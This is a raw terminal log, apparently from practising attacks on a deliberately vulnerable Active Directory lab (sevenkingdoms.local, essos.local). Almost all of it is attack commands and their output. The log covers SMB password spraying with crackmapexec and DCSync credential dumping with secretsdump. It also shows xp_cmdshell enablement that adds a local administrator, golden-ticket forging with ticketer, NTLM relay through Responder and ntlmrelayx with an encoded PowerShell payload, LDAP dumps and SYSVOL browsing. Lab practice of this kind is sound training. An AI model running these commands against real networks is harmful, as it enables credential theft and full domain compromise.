Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\jon.snow:iknownothing 
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
SMB         192.168.20.22   445    CASTELBLACK      [*] Enumerated shares
SMB         192.168.20.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.20.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.20.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.20.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.20.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.20.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.20.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.20.11   445    WINTERFELL       [*] Enumerated shares
SMB         192.168.20.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.20.11   445    WINTERFELL       -----           -----------     ------
SMB         192.168.20.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.20.11   445    WINTERFELL       C$                              Default share
SMB         192.168.20.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.20.11   445    WINTERFELL       NETLOGON        READ            Logon server share
SMB         192.168.20.11   445    WINTERFELL       SYSVOL          READ            Logon server share
SMB         192.168.20.23   445    BRAAVOS          [*] Enumerated shares
SMB         192.168.20.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.20.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.20.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.20.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.20.23   445    BRAAVOS          C$                              Default share
SMB         192.168.20.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.20.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.20.23   445    BRAAVOS          public                          Basic Read share for all domain users
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# 



(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# bloodhound-python -d north.sevenkingdoms.local -u jon.snow -p iknownothing -ns 192.168.20.11 -c All --zip

# Falls weitere Credentials verfügbar
bloodhound-python -d sevenkingdoms.local -u administrator -p recovered_password -ns 192.168.20.10 -c All --zip
bloodhound-python -d essos.local -u administrator -p recovered_password -ns 192.168.20.12 -c All --zip
bloodhound-python: Befehl nicht gefunden.
bloodhound-python: Befehl nicht gefunden.
bloodhound-python: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# ecretsdump.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11 -just-dc

# Falls erfolgreich: Vollständige Credential-Extraktion
secretsdump.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11 -outputfile north_domain_secrets
ecretsdump.py: Befehl nicht gefunden.
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# impacket-mssqlclient -windows-auth north.sevenkingdoms.local/sql_svc:cracked_password@192.168.20.22
impacket-mssqlclient: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Als SYSTEM ausführen (SQL Server-Kontext)
EXEC xp_cmdshell 'whoami';

-- Lokale Admin-Rechte hinzufügen
EXEC xp_cmdshell 'net localgroup administrators "north\jon.snow" /add';

-- PowerShell für weitere Exploitation
EXEC xp_cmdshell 'powershell.exe -enc <base64_encoded_payload>';
EXEC: Befehl nicht gefunden.
RECONFIGURE: Befehl nicht gefunden.
EXEC: Befehl nicht gefunden.
RECONFIGURE: Befehl nicht gefunden.
bash: Syntaxfehler beim unerwarteten Wort »(«
EXEC: Befehl nicht gefunden.
--: Befehl nicht gefunden.
EXEC: Befehl nicht gefunden.
--: Befehl nicht gefunden.
EXEC: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# secretsdump.py -just-dc-user krbtgt north.sevenkingdoms.local/administrator:password@192.168.20.11
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
[*] Cleaning up... 
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# ticketer.py -nthash <krbtgt_nt_hash> -domain-sid <domain_sid_north> -domain north.sevenkingdoms.local -spn cifs/winterfell.north.sevenkingdoms.local administrator

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
klist

# Domain Admin-Zugriff bestätigen
psexec.py -k -no-pass administrator@winterfell.north.sevenkingdoms.local
bash: krbtgt_nt_hash: Datei oder Verzeichnis nicht gefunden
Der Befehl 'klist' wurde nicht gefunden, kann aber installiert werden mit:
apt install krb5-user        # version 1.20.1-6ubuntu2.5, or
apt install heimdal-clients  # version 7.8.git20221117.28daf24+dfsg-3ubuntu4
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] [Errno Connection error (winterfell.north.sevenkingdoms.local:445)] [Errno -2] Name or service not known
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# # Geknackte Credentials validieren
crackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing
crackmapexec smb 192.168.20.0/24 -u brandon.stark -p iseedeadpeople

# Bekannte Default-Credentials testen
crackmapexec smb 192.168.20.0/24 -u samwell.tarly -p Heartsbane

# WinRM-Zugriff testen
crackmapexec winrm 192.168.20.0/24 -u jon.snow -p iknownothing
2025/08/27 11:16:44.911190 cmd_run.go:1408: WARNING: will not expose Kerberos tickets' path: Unsupported KRB5CCNAME: administrator.ccache
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\jon.snow:iknownothing 
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
2025/08/27 11:16:59.375533 cmd_run.go:1408: WARNING: will not expose Kerberos tickets' path: Unsupported KRB5CCNAME: administrator.ccache
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\brandon.stark:iseedeadpeople
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
2025/08/27 11:17:12.414677 cmd_run.go:1408: WARNING: will not expose Kerberos tickets' path: Unsupported KRB5CCNAME: administrator.ccache
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane 
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
2025/08/27 11:17:25.460578 cmd_run.go:1408: WARNING: will not expose Kerberos tickets' path: Unsupported KRB5CCNAME: administrator.ccache
/snap/crackmapexec/295/lib/python3.10/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.20.23'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/snap/crackmapexec/295/lib/python3.10/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.20.11'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/snap/crackmapexec/295/lib/python3.10/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.20.22'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/snap/crackmapexec/295/lib/python3.10/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.20.12'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/snap/crackmapexec/295/lib/python3.10/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.20.10'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
SMB         192.168.20.23   5986   BRAAVOS          [*] Windows 10.0 Build 14393 (name:BRAAVOS) (domain:essos.local)
SMB         192.168.20.22   5986   CASTELBLACK      [*] Windows 10.0 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
SMB         192.168.20.12   5986   MEEREEN          [*] Windows 10.0 Build 14393 (name:MEEREEN) (domain:essos.local)
SMB         192.168.20.10   5986   KINGSLANDING     [*] Windows 10.0 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
SMB         192.168.20.11   5986   WINTERFELL       [*] Windows 10.0 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
HTTP        192.168.20.12   5986   MEEREEN          [*] https://192.168.20.12:5986/wsman
HTTP        192.168.20.22   5986   CASTELBLACK      [*] https://192.168.20.22:5986/wsman
HTTP        192.168.20.23   5986   BRAAVOS          [*] https://192.168.20.23:5986/wsman
HTTP        192.168.20.11   5986   WINTERFELL       [*] https://192.168.20.11:5986/wsman
HTTP        192.168.20.10   5986   KINGSLANDING     [*] https://192.168.20.10:5986/wsman
HTTP        192.168.20.12   5986   MEEREEN          [-] essos.local\jon.snow:iknownothing 
HTTP        192.168.20.22   5986   CASTELBLACK      [-] north.sevenkingdoms.local\jon.snow:iknownothing
HTTP        192.168.20.23   5986   BRAAVOS          [-] essos.local\jon.snow:iknownothing 
HTTP        192.168.20.11   5986   WINTERFELL       [-] north.sevenkingdoms.local\jon.snow:iknownothing
HTTP        192.168.20.10   5986   KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# responder -I eth0 -rdwv &

# SMB Relay gegen Hosts ohne Signierung
echo -e "192.168.20.22\n192.168.20.23" > relay_targets.txt
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell.exe -enc <base64_payload>"

# Monitoring für gefangene Credentials
tail -f /usr/share/responder/logs/SMBv2-*.txt
[1] 519751
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
responder: Befehl nicht gefunden.
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections
tail -f /usr/share/responder/logs/SMBv2-*.txt
exit
^C[1]+  Exit 127                responder -I eth0 -rdwv
tail: '/usr/share/responder/logs/SMBv2-*.txt' kann nicht zum Lesen geöffnet werden: Datei oder Verzeichnis nicht gefunden
tail: Keine Dateien mehr übrig
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# # Mit gültigen Credentials vollständige LDAP-Dumps
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=*)" > ldap_north_complete.txt

# Spezifische Objekt-Klassen
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName description > users_north.txt

ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=group)" sAMAccountName member > groups_north.txt

# Service Principal Names mit Authentication
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "servicePrincipalName=*" servicePrincipalName sAMAccountName > spns_north.txt
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# impacket-mssqlclient -windows-auth north.sevenkingdoms.local/sql_svc:cracked_password@192.168.20.22
impacket-mssqlclient: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# impacket-mssqlclient -windows-auth north.sevenkingdoms.local/sql_svc:cracked_password@192.168.20.22
impacket-mssqlclient: Befehl nicht gefunden.
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# 


root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# smbclient //192.168.20.11/NETLOGON -U jon.snow
Password for [WORKGROUP\jon.snow]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 13 19:13:32 2025
  ..                                  D        0  Sun Apr 13 19:13:32 2025
  script.ps1                          A      165  Sun Apr 13 19:13:29 2025
  secret.ps1                          A      869  Sun Apr 13 19:13:31 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \> smb: \> get script.ps1
smb:: command not found
smb: \> get script.ps1
getting file \script.ps1 of size 165 as script.ps1 (2,0 KiloBytes/sec) (average 2,0 KiloBytes/sec)
smb: \> get secret.ps1 
getting file \secret.ps1 of size 869 as secret.ps1 (11,5 KiloBytes/sec) (average 6,5 KiloBytes/sec)
smb: \> exit
root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# smbclient //192.168.20.11/SYSVOL -U jon.snow
Password for [WORKGROUP\jon.snow]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 13 18:31:11 2025
  ..                                  D        0  Sun Apr 13 18:31:11 2025
  north.sevenkingdoms.local          Dr        0  Sun Apr 13 18:31:11 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \> cd north.sevenkingdoms.local\
smb: \north.sevenkingdoms.local\> dir
  .                                   D        0  Sun Apr 13 18:37:20 2025
  ..                                  D        0  Sun Apr 13 18:37:20 2025
  DfsrPrivate                      DHSr        0  Sun Apr 13 18:37:20 2025
  Policies                            D        0  Sun Apr 13 19:14:36 2025
  scripts                             D        0  Sun Apr 13 19:13:32 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\> cd DfsrPrivate\
cd \north.sevenkingdoms.local\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \north.sevenkingdoms.local\> dir
  .                                   D        0  Sun Apr 13 18:37:20 2025
  ..                                  D        0  Sun Apr 13 18:37:20 2025
  DfsrPrivate                      DHSr        0  Sun Apr 13 18:37:20 2025
  Policies                            D        0  Sun Apr 13 19:14:36 2025
  scripts                             D        0  Sun Apr 13 19:13:32 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\> cd Polic
cd \north.sevenkingdoms.local\Polic\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \north.sevenkingdoms.local\> cd Policies\
smb: \north.sevenkingdoms.local\Policies\> dir
  .                                   D        0  Sun Apr 13 19:14:36 2025
  ..                                  D        0  Sun Apr 13 19:14:36 2025
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun Apr 13 18:31:19 2025
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun Apr 13 18:31:19 2025
  {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}      D        0  Sun Apr 13 19:14:36 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}\
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  GPT.INI                             A       22  Sun Apr 13 18:43:10 2025
  MACHINE                             D        0  Sun Apr 13 18:31:19 2025
  USER                                D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cat GPT.INI
cat: command not found
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> get GPT.INI
getting file \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as GPT.INI (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE\
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Microsoft                           D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Microsoft\
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd Windows NT\
cd \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd Windows NT\
cd \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\> cd ..
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Microsoft                           D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd..
cd..: command not found
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd ..
smb: \north.sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd ..
smb: \north.sevenkingdoms.local\Policies\> dir
  .                                   D        0  Sun Apr 13 19:14:36 2025
  ..                                  D        0  Sun Apr 13 19:14:36 2025
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun Apr 13 18:31:19 2025
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun Apr 13 18:31:19 2025
  {EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D}      D        0  Sun Apr 13 19:14:36 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\> cd {6AC1786C-016F-11D2-945F-00C04fB984F9}\
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  GPT.INI                             A       22  Sun Apr 13 18:31:19 2025
  MACHINE                             D        0  Sun Apr 13 18:31:19 2025
  USER                                D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> get GPT.INI
getting file \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd MACHINE\
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> di
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Microsoft                           D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Microsoft                           D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> cd Microsoft\
smb: \north.sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> dir
  .                                   D        0  Sun Apr 13 18:31:19 2025
  ..                                  D        0  Sun Apr 13 18:31:19 2025
  Windows NT                          D        0  Sun Apr 13 18:31:19 2025

		10485247 blocks of size 4096. 7455044 blocks available
